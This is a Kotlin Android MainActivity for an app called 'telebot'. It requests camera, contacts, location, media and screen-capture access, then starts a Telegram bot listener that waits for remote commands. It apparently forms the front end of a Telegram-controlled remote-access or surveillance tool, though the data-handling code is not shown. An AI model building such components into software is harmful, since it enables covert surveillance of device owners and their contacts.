package com.example.telebot

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.annotation.RequiresApi
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.telebot.ui.theme.YourAppTheme

class MainActivity : ComponentActivity() {

    companion object {
        var mediaProjectionData: Intent? = null
        var mediaProjectionResultCode: Int = Activity.RESULT_CANCELED
    }

    private val SCREEN_CAPTURE_REQUEST_CODE = 1234
    private val PERMISSIONS_REQUEST_CODE = 5678

    // Required permissions for Android 13+
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Check & request permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissionsIfNeeded()
        } else {
            // For Android < 13
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.CAMERA,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ),
                PERMISSIONS_REQUEST_CODE
            )
        }

        // Request screen capture permission
        requestScreenCapturePermission()

        // Minimal UI
        setContent {
            YourAppTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(24.dp),
                        verticalArrangement = Arrangement.Center
                    ) {
                        Text(
                            text = "🤖 Bot is actively listening for Telegram commands...",
                            style = MaterialTheme.typography.bodyLarge
                        )
                    }
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestPermissionsIfNeeded() {
        val missing = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERMISSIONS_REQUEST_CODE)
        }
    }

    private fun requestScreenCapturePermission() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = projectionManager.createScreenCaptureIntent()
        startActivityForResult(captureIntent, SCREEN_CAPTURE_REQUEST_CODE)
    }

    @Deprecated("Use Activity Result API")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
            mediaProjectionData = data
            mediaProjectionResultCode = resultCode

            // ✅ Start bot listener after permission is granted
            TelegramBotManager.startListening(applicationContext)
        }
    }
}
